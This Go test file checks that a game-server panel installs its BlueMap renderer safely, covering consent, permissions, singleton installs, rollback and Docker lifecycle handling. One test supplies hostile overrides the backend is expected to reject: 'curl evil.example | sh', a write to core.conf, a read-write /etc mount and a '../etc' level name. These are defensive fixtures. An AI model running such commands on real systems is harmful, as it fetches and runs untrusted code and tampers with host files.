// SPDX-License-Identifier: MPL-2.0
// This Source Code Form is subject to the terms of the Mozilla Public
// License, v. 2.0. If a copy of the MPL was not distributed with this
// file, You can obtain one at https://mozilla.org/MPL/2.0/.

package services

import (
	"context"
	"encoding/json"
	"errors"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"sync/atomic"
	"testing"
	"time"

	"connectrpc.com/connect"

	"github.com/athNdev/carbon-panel/internal/auth"
	"github.com/athNdev/carbon-panel/internal/bluemapdiscovery"
	"github.com/athNdev/carbon-panel/internal/config"
	storage "github.com/athNdev/carbon-panel/internal/db"
	"github.com/athNdev/carbon-panel/internal/docker"
	"github.com/athNdev/carbon-panel/internal/module"
	"github.com/athNdev/carbon-panel/internal/nodestorage"
	"github.com/athNdev/carbon-panel/internal/proxy"
	"github.com/athNdev/carbon-panel/internal/rbac"
	"github.com/athNdev/carbon-panel/pkg/logger"
	v1 "github.com/athNdev/carbon-panel/pkg/proto/carbonpanel/v1"
	"github.com/athNdev/carbon-panel/pkg/proto/carbonpanel/v1/carbonpanelv1connect"
)

func strPtrFixture(s string) *string { return &s }

// Owned world fixture: a custom level folder with a readable level.dat and
// standard dimensions. No live world is touched.
func worldFixture(t *testing.T, level string) string {
	t.Helper()
	root := t.TempDir()
	world := filepath.Join(root, level)
	for _, dir := range []string{world, filepath.Join(world, "DIM-1"), filepath.Join(world, "DIM1")} {
		if err := os.MkdirAll(dir, 0o755); err != nil {
			t.Fatal(err)
		}
	}
	if err := os.WriteFile(filepath.Join(world, "level.dat"), []byte("fixture"), 0o644); err != nil {
		t.Fatal(err)
	}
	return root
}

func blueMapFixtureStore(t *testing.T, ctx context.Context, serverID, nodeID, level string) (*storage.Store, string) {
	t.Helper()
	store := setupTestStore(t)
	dataRoot := worldFixture(t, level)
	if err := store.CreateServer(ctx, &storage.Server{
		ID: serverID, Name: "BlueMap host", NodeID: nodeID, DataPath: dataRoot,
		Status: storage.StatusStopped,
	}); err != nil {
		t.Fatal(err)
	}
	if err := store.SaveServerConfig(ctx, &storage.ServerConfig{
		ID: serverID, ServerID: serverID, Level: strPtrFixture(level),
	}); err != nil {
		t.Fatal(err)
	}
	if err := store.CreateModuleTemplate(ctx, &storage.ModuleTemplate{
		ID: blueMapTemplateID, Name: "BlueMap",
		DockerImage: "ghcr.io/bluemap-minecraft/bluemap:v5.29",
		Type:        storage.ModuleTemplateTypeBuiltin,
		Ports:       []*v1.ModulePort{{Name: "Web", ContainerPort: 8100, Protocol: "http", ProxyEnabled: true}},
	}); err != nil {
		t.Fatal(err)
	}
	return store, dataRoot
}

// TestBuiltinBlueMapConcurrentInstallIsSingleton is the server-side fixture
// the UI cannot provide: parallel tabs/operators/retries hitting CreateModule
// must converge on exactly one module per server, with no duplicates and the
// same truthful result for every caller. The guarantee is scoped to ONE
// controller process (the blueMapInstallMu mutex), not across controllers.
func TestBuiltinBlueMapConcurrentInstallIsSingleton(t *testing.T) {
	ctx := auth.WithUser(context.Background(), &auth.AuthenticatedUser{
		ID: "admin-1", Username: "admin", Roles: []string{"admin"},
	})
	store, _ := blueMapFixtureStore(t, ctx, "srv-bluemap", "default", "actual_world")
	defer func() { _ = store.Close() }()
	tpl, err := store.GetModuleTemplate(ctx, blueMapTemplateID)
	if err != nil {
		t.Fatal(err)
	}

	log := logger.New()
	svc := &ModuleService{
		store: store, enforcer: mustEnforcer(t, store), storageResolver: nodestorage.NewResolver(nil),
		moduleManager: module.NewManager(store, nil, nil, &config.Config{}, nil, log), log: log,
	}

	const callers = 12
	var wg sync.WaitGroup
	results := make([]string, callers)
	errs := make([]error, callers)
	start := make(chan struct{})
	for i := 0; i < callers; i++ {
		wg.Add(1)
		go func(i int) {
			defer wg.Done()
			<-start
			resp, err := svc.CreateModule(ctx, connect.NewRequest(&v1.CreateModuleRequest{
				Name: "BlueMap", ServerId: "srv-bluemap", TemplateId: blueMapTemplateID,
				Metadata: map[string]string{blueMapManagedSignalKey: "true", blueMapConsentSignalKey: "true"},
			}))
			errs[i] = err
			if resp != nil && resp.Msg != nil && resp.Msg.Module != nil {
				results[i] = resp.Msg.Module.Id
			}
		}(i)
	}
	close(start)
	wg.Wait()

	for i, err := range errs {
		if err != nil {
			t.Fatalf("caller %d: CreateModule: %v", i, err)
		}
		if results[i] == "" {
			t.Fatalf("caller %d returned no module", i)
		}
	}
	for i := 1; i < callers; i++ {
		if results[i] != results[0] {
			t.Fatalf("caller %d got module %s, caller 0 got %s: not a singleton", i, results[i], results[0])
		}
	}
	modules, err := store.ListModulesByTemplate(ctx, blueMapTemplateID)
	if err != nil {
		t.Fatal(err)
	}
	if len(modules) != 1 {
		t.Fatalf("persisted %d BlueMap modules, want exactly 1", len(modules))
	}
	persisted, err := store.GetModule(ctx, results[0])
	if err != nil {
		t.Fatal(err)
	}
	if persisted.Metadata["bluemap_consent"] != "accepted" ||
		persisted.Metadata["bluemap_consent_by"] != "admin-1" ||
		persisted.Metadata["bluemap_consent_at"] == "" {
		t.Fatalf("consent actor/time were not derived server-side: %+v", persisted.Metadata)
	}

	// Adoption preserves the existing module and its config verbatim, even for
	// a different operator with a spoofed consent payload.
	spoof := auth.WithUser(context.Background(), &auth.AuthenticatedUser{ID: "attacker", Roles: []string{"admin"}})
	spoofReq := &v1.CreateModuleRequest{
		Name: "BlueMap", ServerId: "srv-bluemap", TemplateId: blueMapTemplateID,
		Metadata: map[string]string{blueMapManagedSignalKey: "true", blueMapConsentSignalKey: "true", "bluemap_consent_by": "spoofed"},
	}
	handled, resp, finalize, prepErr := svc.prepareBuiltinBlueMap(spoof, spoofReq,
		&storage.Server{ID: "srv-bluemap", NodeID: "default"}, tpl)
	if finalize != nil {
		defer func() { _ = finalize(false, "") }()
	}
	if !handled || prepErr != nil || resp == nil {
		t.Fatalf("second install should be handled as adoption: handled=%v err=%v", handled, prepErr)
	}
	if spoofReq.Metadata["bluemap_consent_by"] != "spoofed" {
		t.Fatal("adoption must not rewrite existing consent metadata")
	}
}

// The managed variant discards every unsafe client override and derives the
// private port, read-only canonical world bind and pinned command on the
// backend from the actual level folder.
func TestBuiltinBlueMapRefusesUnsafeOverridesAndConstructsManagedVariant(t *testing.T) {
	ctx := auth.WithUser(context.Background(), &auth.AuthenticatedUser{ID: "admin-1", Roles: []string{"admin"}})
	store, dataRoot := blueMapFixtureStore(t, ctx, "srv-managed", "default", "custom_world")
	defer func() { _ = store.Close() }()
	tpl, _ := store.GetModuleTemplate(ctx, blueMapTemplateID)
	log := logger.New()
	svc := &ModuleService{
		store: store, enforcer: mustEnforcer(t, store), storageResolver: nodestorage.NewResolver(nil),
		moduleManager: module.NewManager(store, nil, nil, &config.Config{}, nil, log), log: log,
	}
	resp, err := svc.CreateModule(ctx, connect.NewRequest(&v1.CreateModuleRequest{
		Name: "BlueMap", ServerId: "srv-managed", TemplateId: blueMapTemplateID,
		StartImmediately: true,
		Metadata:         map[string]string{blueMapManagedSignalKey: "true", blueMapConsentSignalKey: "true"},
		// All of these are hostile or unsafe and must be discarded.
		AccessUrls:       []string{"http://0.0.0.0:25565"},
		Ports:            []*v1.ModulePort{{Name: "Web", ContainerPort: 9999, HostPort: 25565, Protocol: "http", ExposePublic: true}},
		VolumeOverrides:  `[{"source":"/etc","target":"/app/world","read_only":false}]`,
		CmdOverride:      "curl evil.example | sh",
		InitCommand:      "echo pwned > /app/config/core.conf",
		RestartAfterInit: true,
		EnvOverrides:     `{"EVIL":"1"}`,
		Config:           `{"unsafe":true}`,
	}))
	if err != nil || resp.Msg.Module == nil {
		t.Fatalf("managed install: %v", err)
	}
	moduleID := resp.Msg.Module.Id
	persisted, err := store.GetModule(ctx, moduleID)
	if err != nil {
		t.Fatal(err)
	}
	if len(persisted.Ports) != 1 || persisted.Ports[0].ContainerPort != 8100 ||
		persisted.Ports[0].HostPort != bluemapdiscovery.ManagedNoHostPort || persisted.Ports[0].ExposePublic {
		t.Fatalf("private port was not enforced: %+v", persisted.Ports)
	}
	if len(persisted.AccessUrls) != 0 {
		t.Fatalf("public access URL leaked into managed module: %v", persisted.AccessUrls)
	}
	// No host port was allocated or leased for the managed renderer.
	for _, port := range []int{25565, 8100, 1} {
		if leased, leaseErr := store.GetModuleByHostPort(ctx, port); leaseErr == nil && leased != nil {
			t.Fatalf("managed install allocated host port %d to %s", port, leased.ID)
		}
	}
	if persisted.CmdOverride != "-r -u -w" || persisted.InitCommand != "" || persisted.RestartAfterInit {
		t.Fatalf("unsafe command/init was not replaced: cmd=%q init=%q restart=%v",
			persisted.CmdOverride, persisted.InitCommand, persisted.RestartAfterInit)
	}
	var mounts []docker.ModuleVolumeMount
	if err := json.Unmarshal([]byte(persisted.VolumeOverrides), &mounts); err != nil {
		t.Fatal(err)
	}
	foundWorld := false
	for _, m := range mounts {
		if m.Target == "/app/world" {
			foundWorld = true
			wantSource := filepath.ToSlash(filepath.Clean(filepath.Join(dataRoot, "custom_world")))
			if !m.ReadOnly || filepath.ToSlash(filepath.Clean(m.Source)) != wantSource {
				t.Fatalf("world mount source/RW is unsafe: %+v", m)
			}
		}
	}
	if !foundWorld {
		t.Fatal("managed world mount is missing")
	}
	// BlueMap must be able to write its Mojang resource cache even though the
	// module rootfs is read-only; otherwise the installed renderer exits with
	// "Resource-File missing" and no map is ever served (OSS-388 E2E).
	foundResources := false
	for _, m := range mounts {
		if m.Target == "/app/bluemap" {
			foundResources = true
			if m.ReadOnly || !strings.HasPrefix(filepath.ToSlash(filepath.Clean(m.Source)),
				filepath.ToSlash(filepath.Clean(filepath.Join(dataRoot, "modules", "bluemap")))) {
				t.Fatalf("resource cache mount is not panel-owned and writable: %+v", m)
			}
		}
	}
	if !foundResources {
		t.Fatal("managed BlueMap resource-cache mount (/app/bluemap) is missing")
	}

	// Backend-generated config: consent + one map per ACTUAL dimension, with
	// the canonical world path; no client-supplied sed command is used.
	read := func(rel string) string {
		raw, err := os.ReadFile(filepath.Join(dataRoot, rel))
		if err != nil {
			t.Fatalf("read %s: %v", rel, err)
		}
		return string(raw)
	}
	core := read("modules/bluemap/config/core.conf")
	if !strings.Contains(core, "accept-download: true") || strings.Contains(core, "sed") {
		t.Fatalf("managed core config is wrong: %s", core)
	}
	for _, dim := range []string{"custom_world", "custom_world_nether", "custom_world_end"} {
		conf := read("modules/bluemap/config/maps/" + dim + ".conf")
		if !strings.Contains(conf, `world: "/app/world`) || !strings.Contains(conf, "dimension:") {
			t.Fatalf("map config %s is not derived from actual world facts: %s", dim, conf)
		}
	}
	_ = tpl
}

// Parity: the managed World View action and the legacy Modules-page action
// share ModuleService, but the managed consent workflow is isolated. Existing
// operators are not broken; the managed path remains non-bypassable.
func TestBuiltinBlueMapManagedActionIsolatedFromGenericCreate(t *testing.T) {
	ctx := auth.WithUser(context.Background(), &auth.AuthenticatedUser{ID: "admin-1", Username: "admin", Roles: []string{"admin"}})
	store, _ := blueMapFixtureStore(t, ctx, "srv-parity", "default", "actual_world")
	defer func() { _ = store.Close() }()
	log := logger.New()
	svc := &ModuleService{
		store: store, enforcer: mustEnforcer(t, store), storageResolver: nodestorage.NewResolver(nil),
		moduleManager: module.NewManager(store, nil, nil, &config.Config{}, nil, log), log: log,
	}

	managedNoConsent := &v1.CreateModuleRequest{
		Name: "BlueMap", ServerId: "srv-parity", TemplateId: blueMapTemplateID,
		Metadata: map[string]string{blueMapManagedSignalKey: "true"},
	}
	handled, _, finalize, err := svc.prepareBuiltinBlueMap(ctx, managedNoConsent,
		&storage.Server{ID: "srv-parity", NodeID: "default"}, nil)
	if finalize != nil {
		defer func() { _ = finalize(false, "") }()
	}
	if !handled || err == nil || !strings.Contains(err.Error(), "explicit acceptance") {
		t.Fatalf("managed install without consent must be refused: handled=%v err=%v", handled, err)
	}

	// Generic create (Modules page) keeps working without the managed signal.
	resp, err := svc.CreateModule(ctx, connect.NewRequest(&v1.CreateModuleRequest{
		Name: "BlueMap (manual)", ServerId: "srv-parity", TemplateId: blueMapTemplateID,
	}))
	if err != nil || resp.Msg.Module == nil {
		t.Fatalf("generic module creation must not be broken by managed consent: %v", err)
	}
	modules, _ := store.ListModulesByTemplate(ctx, blueMapTemplateID)
	if len(modules) != 1 {
		t.Fatalf("generic path should create exactly one module, got %d", len(modules))
	}
	if _, ok := modules[0].Metadata[blueMapManagedSignalKey]; ok {
		t.Fatal("generic module must not be marked managed")
	}
}

// An injected config-commit failure must delete the just-persisted module row
// while the singleton lock is still held, so no racing caller can adopt a
// half-installed module. A later retry succeeds cleanly with exactly one row.
func TestBuiltinBlueMapCommitFailureRollbackAndRetry(t *testing.T) {
	ctx := auth.WithUser(context.Background(), &auth.AuthenticatedUser{ID: "admin-1", Roles: []string{"admin"}})
	store, dataRoot := blueMapFixtureStore(t, ctx, "srv-retry", "default", "actual_world")
	defer func() { _ = store.Close() }()
	log := logger.New()
	svc := &ModuleService{
		store: store, enforcer: fakeModuleAuthorizer{allowCreate: true, allowStart: true},
		storageResolver: nodestorage.NewResolver(nil),
		moduleManager:   module.NewManager(store, nil, nil, &config.Config{}, nil, log), log: log,
	}
	request := func() *v1.CreateModuleRequest {
		return &v1.CreateModuleRequest{
			Name: "BlueMap", ServerId: "srv-retry", TemplateId: blueMapTemplateID,
			Metadata: map[string]string{blueMapManagedSignalKey: "true", blueMapConsentSignalKey: "true"},
		}
	}

	bluemapdiscovery.ManagedConfigCommitHook = func() error { return errors.New("injected commit failure") }
	_, err := svc.CreateModule(ctx, connect.NewRequest(request()))
	bluemapdiscovery.ManagedConfigCommitHook = nil
	if err == nil || connect.CodeOf(err) != connect.CodeInternal {
		t.Fatalf("commit failure should surface as internal error, got %v", err)
	}
	modules, _ := store.ListModulesByTemplate(ctx, blueMapTemplateID)
	if len(modules) != 0 {
		t.Fatalf("failed install left %d adoptable module rows", len(modules))
	}
	if _, statErr := os.Stat(filepath.Join(dataRoot, "modules", "bluemap", "config", "core.conf")); !os.IsNotExist(statErr) {
		t.Fatalf("failed install left committed config behind: %v", statErr)
	}

	resp, err := svc.CreateModule(ctx, connect.NewRequest(request()))
	if err != nil || resp.Msg.Module == nil {
		t.Fatalf("retry after rollback should succeed: %v", err)
	}
	modules, _ = store.ListModulesByTemplate(ctx, blueMapTemplateID)
	if len(modules) != 1 {
		t.Fatalf("retry persisted %d modules, want 1", len(modules))
	}
	if _, err := os.Stat(filepath.Join(dataRoot, "modules", "bluemap", "config", "core.conf")); err != nil {
		t.Fatalf("retry did not write config: %v", err)
	}
}

// Every refusal happens before any filesystem side effect: no config dir, no
// staged file, no committed core.conf. This locks in the authorization ordering.
func TestBuiltinBlueMapRefusalsHaveZeroConfigSideEffects(t *testing.T) {
	ctx := auth.WithUser(context.Background(), &auth.AuthenticatedUser{ID: "admin-1", Roles: []string{"admin"}})
	cases := []struct {
		name      string
		authorize fakeModuleAuthorizer
		world     bool
		start     bool
		wantCode  connect.Code
	}{
		{"create denied", fakeModuleAuthorizer{allowCreate: false, allowStart: false}, true, false, connect.CodePermissionDenied},
		{"start denied with startImmediately", fakeModuleAuthorizer{allowCreate: true, allowStart: false}, true, true, connect.CodePermissionDenied},
		{"invalid world facts", fakeModuleAuthorizer{allowCreate: true, allowStart: true}, false, false, connect.CodeFailedPrecondition},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			store, dataRoot := blueMapFixtureStore(t, ctx, "srv-refusal", "default", "actual_world")
			defer func() { _ = store.Close() }()
			tpl, _ := store.GetModuleTemplate(ctx, blueMapTemplateID)
			if !tc.world {
				_ = os.RemoveAll(filepath.Join(dataRoot, "actual_world"))
			}
			svc := &ModuleService{
				store: store, enforcer: tc.authorize, storageResolver: nodestorage.NewResolver(nil),
			}
			_, _, finalize, err := svc.prepareBuiltinBlueMap(ctx, &v1.CreateModuleRequest{
				Name: "BlueMap", ServerId: "srv-refusal", TemplateId: blueMapTemplateID,
				StartImmediately: tc.start,
				Metadata:         map[string]string{blueMapManagedSignalKey: "true", blueMapConsentSignalKey: "true"},
			}, &storage.Server{ID: "srv-refusal", NodeID: "default", DataPath: dataRoot}, tpl)
			if finalize != nil {
				defer func() { _ = finalize(false, "") }()
			}
			if err == nil || connect.CodeOf(err) != tc.wantCode {
				t.Fatalf("refusal = %v, want %v", err, tc.wantCode)
			}
			configDir := filepath.Join(dataRoot, "modules", "bluemap", "config")
			if _, statErr := os.Stat(configDir); !os.IsNotExist(statErr) {
				t.Fatalf("refusal created config side effects at %s: %v", configDir, statErr)
			}
		})
	}
}

type fakeModuleAuthorizer struct {
	allowCreate bool
	allowStart  bool
}

func (f fakeModuleAuthorizer) Enforce(_ []string, _ string, action, _ string) (bool, error) {
	switch action {
	case rbac.ActionCreate:
		return f.allowCreate, nil
	case rbac.ActionStart:
		return f.allowStart, nil
	}
	return false, nil
}

func mustEnforcer(t *testing.T, store *storage.Store) *rbac.Enforcer {
	t.Helper()
	enforcer, err := rbac.NewEnforcer(store.DB())
	if err != nil {
		t.Fatal(err)
	}
	if err := enforcer.SeedDefaultPolicies(false); err != nil {
		t.Fatal(err)
	}
	return enforcer
}

// Consent is explicit; remote nodes and invalid worlds are refused by the
// BACKEND with specific reasons before any module is created.
func TestBuiltinBlueMapBackendEligibilityFixture(t *testing.T) {
	ctx := auth.WithUser(context.Background(), &auth.AuthenticatedUser{ID: "admin-1", Roles: []string{"admin"}})
	store := setupTestStore(t)
	defer func() { _ = store.Close() }()
	tpl := &storage.ModuleTemplate{ID: blueMapTemplateID, DockerImage: "ghcr.io/bluemap-minecraft/bluemap:v5.29"}
	svc := &ModuleService{store: store, enforcer: mustEnforcer(t, store), storageResolver: nodestorage.NewResolver(nil)}

	cases := []struct {
		name       string
		nodeID     string
		level      string
		world      bool
		template   *storage.ModuleTemplate
		metadata   map[string]string
		wantCode   connect.Code
		wantReason string
	}{
		{"no consent", "default", "actual_world", true, tpl, map[string]string{blueMapManagedSignalKey: "true"}, connect.CodeInvalidArgument, "explicit acceptance"},
		{"unknown node", "node-2", "actual_world", true, tpl, map[string]string{blueMapManagedSignalKey: "true", blueMapConsentSignalKey: "true"}, connect.CodeFailedPrecondition, "ownership could not be verified"},
		{"invalid level", "default", "../etc", true, tpl, map[string]string{blueMapManagedSignalKey: "true", blueMapConsentSignalKey: "true"}, connect.CodeFailedPrecondition, "level name is invalid"},
		{"unpinned image", "default", "actual_world", true, &storage.ModuleTemplate{ID: blueMapTemplateID, DockerImage: "ghcr.io/bluemap-minecraft/bluemap:latest"}, map[string]string{blueMapManagedSignalKey: "true", blueMapConsentSignalKey: "true"}, connect.CodeFailedPrecondition, "not the pinned"},
		{"missing world", "default", "actual_world", false, tpl, map[string]string{blueMapManagedSignalKey: "true", blueMapConsentSignalKey: "true"}, connect.CodeFailedPrecondition, "readable Minecraft Java Edition world"},
	}
	for i, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			id := "srv-case-" + string(rune('a'+i))
			dataRoot := t.TempDir()
			if tc.world {
				world := filepath.Join(dataRoot, tc.level)
				_ = os.MkdirAll(world, 0o755)
				_ = os.WriteFile(filepath.Join(world, "level.dat"), []byte("fixture"), 0o644)
			}
			if err := store.CreateServer(ctx, &storage.Server{ID: id, NodeID: tc.nodeID, DataPath: dataRoot}); err != nil {
				t.Fatal(err)
			}
			if err := store.SaveServerConfig(ctx, &storage.ServerConfig{ID: id, ServerID: id, Level: strPtrFixture(tc.level)}); err != nil {
				t.Fatal(err)
			}
			handled, _, finalize, err := svc.prepareBuiltinBlueMap(ctx, &v1.CreateModuleRequest{
				Name: "BlueMap", ServerId: id, TemplateId: blueMapTemplateID, Metadata: tc.metadata,
			}, &storage.Server{ID: id, NodeID: tc.nodeID}, tc.template)
			if finalize != nil {
				defer func() { _ = finalize(false, "") }()
			}
			if !handled || err == nil {
				t.Fatalf("expected refusal, got handled=%v err=%v", handled, err)
			}
			if connect.CodeOf(err) != tc.wantCode || !strings.Contains(err.Error(), tc.wantReason) {
				t.Fatalf("refusal = %v, want %v containing %q", err, tc.wantCode, tc.wantReason)
			}
		})
	}
}

// startImmediately is a second privileged action: modules/create is not enough.
func TestBuiltinBlueMapStartImmediatelyRequiresModulesStartFixture(t *testing.T) {
	store := setupTestStore(t)
	defer func() { _ = store.Close() }()
	const serverID = "srv-start-auth"
	ctxAdmin := auth.WithUser(context.Background(), &auth.AuthenticatedUser{ID: "a1", Username: "admin", Roles: []string{"admin"}})
	_, _ = blueMapFixtureStore(t, ctxAdmin, serverID, "default", "actual_world")
	tpl, _ := store.GetModuleTemplate(ctxAdmin, blueMapTemplateID)
	log := logger.New()
	svc := &ModuleService{
		store: store, enforcer: fakeModuleAuthorizer{allowCreate: true, allowStart: false},
		storageResolver: nodestorage.NewResolver(nil),
		moduleManager:   module.NewManager(store, nil, nil, &config.Config{}, nil, log), log: log,
	}
	request := func() *v1.CreateModuleRequest {
		return &v1.CreateModuleRequest{
			Name: "BlueMap", ServerId: serverID, TemplateId: blueMapTemplateID,
			StartImmediately: true,
			Metadata:         map[string]string{blueMapManagedSignalKey: "true", blueMapConsentSignalKey: "true"},
		}
	}

	reader := auth.WithUser(context.Background(), &auth.AuthenticatedUser{ID: "u1", Roles: []string{"user"}})
	_, err := svc.CreateModule(reader, connect.NewRequest(request()))
	if err == nil || connect.CodeOf(err) != connect.CodePermissionDenied || !strings.Contains(err.Error(), "modules/start") {
		t.Fatalf("modules/create-only user must be denied start with the exact scope, got %v", err)
	}
	modules, _ := store.ListModulesByTemplate(context.Background(), blueMapTemplateID)
	if len(modules) != 0 {
		t.Fatalf("permission-denied start must not create a module, got %d", len(modules))
	}

	svc.enforcer = fakeModuleAuthorizer{allowCreate: true, allowStart: true}
	admin := auth.WithUser(context.Background(), &auth.AuthenticatedUser{ID: "a1", Username: "admin", Roles: []string{"admin"}})
	resp, err := svc.CreateModule(admin, connect.NewRequest(request()))
	if err != nil || resp.Msg.Module == nil {
		t.Fatalf("admin create+start must succeed, got %v", err)
	}
	_ = tpl
}

func TestMountedManagedBlueMapHoldsTransitionThroughRuntime(t *testing.T) {
	for _, tc := range []struct {
		name             string
		startStatus      int
		stallStart       bool
		wantModuleStatus storage.ModuleStatus
	}{
		{name: "successful start", startStatus: http.StatusNoContent, wantModuleStatus: storage.ModuleStatusRunning},
		{name: "failed daemon start", startStatus: http.StatusInternalServerError, wantModuleStatus: storage.ModuleStatusError},
		{name: "stalled daemon start", stallStart: true, wantModuleStatus: storage.ModuleStatusError},
	} {
		t.Run(tc.name, func(t *testing.T) {
			ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
			defer cancel()
			const serverID = "srv-managed-lease"
			const containerID = "abcdef0123456789"
			store, _ := blueMapFixtureStore(t, ctx, serverID, "default", "actual_world")
			t.Cleanup(func() { _ = store.Close() })
			if err := store.UpdateServerFields(ctx, serverID, map[string]any{"proxy_hostname": "world.test"}); err != nil {
				t.Fatal(err)
			}
			creating, starting := make(chan struct{}, 1), make(chan struct{}, 1)
			createDone, startDone := make(chan struct{}), make(chan struct{})
			startCanceled := make(chan struct{})
			var creates, inspects, starts atomic.Int32
			var allowCreate, allowStart sync.Once
			unblockCreate := func() { allowCreate.Do(func() { close(createDone) }) }
			unblockStart := func() { allowStart.Do(func() { close(startDone) }) }
			dockerAPI := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
				w.Header().Set("Content-Type", "application/json")
				switch {
				case r.URL.Path == "/_ping":
					w.Header().Set("Api-Version", "1.45")
				case strings.Contains(r.URL.Path, "/images/") && strings.HasSuffix(r.URL.Path, "/json"):
					_, _ = w.Write([]byte(`{"Id":"sha256:fixture"}`))
				case strings.HasSuffix(r.URL.Path, "/containers/create"):
					if creates.Add(1) == 1 {
						creating <- struct{}{}
						<-createDone
					}
					_, _ = w.Write([]byte(`{"Id":"` + containerID + `"}`))
				case strings.HasSuffix(r.URL.Path, "/containers/"+containerID+"/json"):
					inspects.Add(1)
					_, _ = w.Write([]byte(`{"State":{"Status":"created"}}`))
				case strings.HasSuffix(r.URL.Path, "/containers/"+containerID+"/start"):
					if starts.Add(1) > 1 {
						w.WriteHeader(http.StatusNoContent)
						return
					}
					starting <- struct{}{}
					select {
					case <-r.Context().Done():
						close(startCanceled)
						return
					case <-startDone:
					}
					if tc.stallStart {
						return // test cleanup
					}
					w.WriteHeader(tc.startStatus)
					if tc.startStatus != http.StatusNoContent {
						_, _ = w.Write([]byte(`{"message":"fixture daemon refused startup"}`))
					}
				default:
					http.NotFound(w, r)
				}
			}))
			t.Cleanup(dockerAPI.Close)
			log := logger.New()
			dockerClient, err := docker.NewClient(strings.Replace(dockerAPI.URL, "http://", "tcp://", 1), log)
			if err != nil {
				t.Fatal(err)
			}
			t.Cleanup(func() { _ = dockerClient.Close() })
			t.Cleanup(func() {
				unblockCreate()
				unblockStart()
				waitCtx, cancel := context.WithTimeout(context.Background(), 3*time.Second)
				defer cancel()
				_ = docker.WaitForServerTransition(waitCtx, serverID)
			})
			cfg := &config.Config{Proxy: config.ProxyConfig{Enabled: true}}
			proxyManager := proxy.NewManager(store, cfg, log, dockerClient.GetDockerClient())
			svc := &ModuleService{
				store: store, enforcer: mustEnforcer(t, store), storageResolver: nodestorage.NewResolver(nil),
				docker: dockerClient, moduleManager: module.NewManager(store, dockerClient, nil, cfg, proxyManager, log), log: log,
			}
			if tc.stallStart {
				svc.blueMapStartupTimeout = 2 * time.Second
			}
			_, handler := carbonpanelv1connect.NewModuleServiceHandler(svc, connect.WithInterceptors(
				connect.UnaryInterceptorFunc(func(next connect.UnaryFunc) connect.UnaryFunc {
					return func(ctx context.Context, req connect.AnyRequest) (connect.AnyResponse, error) {
						return next(auth.WithUser(ctx, &auth.AuthenticatedUser{ID: "admin-1", Roles: []string{"admin"}}), req)
					}
				}),
			))
			panel := httptest.NewServer(handler)
			defer panel.Close()
			client := carbonpanelv1connect.NewModuleServiceClient(panel.Client(), panel.URL)
			install := func() (*connect.Response[v1.CreateModuleResponse], error) {
				return client.CreateModule(ctx, connect.NewRequest(&v1.CreateModuleRequest{
					Name: "BlueMap", ServerId: serverID, TemplateId: blueMapTemplateID, StartImmediately: true,
					Dependencies: []*v1.ModuleDependency{{ModuleId: "unrelated-module"}},
					Metadata:     map[string]string{blueMapManagedSignalKey: "true", blueMapConsentSignalKey: "true"},
				}))
			}
			waitFor := func(signal <-chan struct{}, phase string) {
				t.Helper()
				select {
				case <-signal:
				case <-ctx.Done():
					t.Fatalf("daemon did not reach %s: %v", phase, ctx.Err())
				}
			}
			assertHeld := func(phase string) {
				t.Helper()
				lease, err := docker.TryBeginServerTransition(serverID)
				lease.Release()
				if !errors.Is(err, docker.ErrTransitionInFlight) {
					t.Fatalf("migration could claim the transition during %s: %v", phase, err)
				}
			}
			result, err := install()
			if err != nil {
				t.Fatal(err)
			}
			moduleID := result.Msg.GetModule().GetId()
			if moduleID == "" {
				t.Fatal("install returned no renderer")
			}
			waitFor(creating, "container create")
			assertHeld("container create")
			unblockCreate()
			waitFor(starting, "container start")
			assertHeld("container start")
			retry, err := install()
			if err != nil || retry.Msg.GetModule().GetId() != moduleID {
				t.Fatalf("same-assignment install did not adopt the committed renderer: %v %v", retry, err)
			}
			if tc.stallStart {
				waitFor(startCanceled, "startup request cancellation")
			} else {
				unblockStart()
			}
			if err := docker.WaitForServerTransition(ctx, serverID); err != nil {
				t.Fatalf("startup did not release the transition: %v", err)
			}
			lease, err := docker.TryBeginServerTransition(serverID)
			if err != nil {
				t.Fatalf("migration still blocked after daemon completed: %v", err)
			}
			defer lease.Release()
			row, err := store.GetModule(ctx, moduleID)
			if err != nil || row.Status != tc.wantModuleStatus || row.ContainerID != containerID {
				t.Fatalf("module after transition release: %v %v", row, err)
			}
			if _, err := install(); connect.CodeOf(err) != connect.CodeAborted {
				t.Fatalf("install bypassed another owner's transition: %v", err)
			}
			lease.Release()
			if tc.stallStart {
				if _, err := client.StartModule(ctx, connect.NewRequest(&v1.StartModuleRequest{Id: moduleID})); err != nil {
					t.Fatalf("retry start after timeout: %v", err)
				}
				row, err := store.GetModule(ctx, moduleID)
				if err != nil || row.Status != storage.ModuleStatusRunning || row.ContainerID != containerID {
					t.Fatalf("retry did not start the same module container: %v %v", row, err)
				}
				if creates.Load() != 1 || starts.Load() != 2 {
					t.Fatalf("expected one create and two starts, got %d creates and %d starts", creates.Load(), starts.Load())
				}
			}
			if err := proxyManager.UpdateModuleRoute(row, &storage.Server{ProxyHostname: "world.test"}); err != nil {
				t.Fatalf("private renderer route refresh: %v", err)
			}
			if inspects.Load() != starts.Load() || len(proxyManager.GetModuleRoutes()) != 0 {
				t.Fatalf("private renderer reached host route setup: %d inspects for %d starts", inspects.Load(), starts.Load())
			}
		})
	}
}
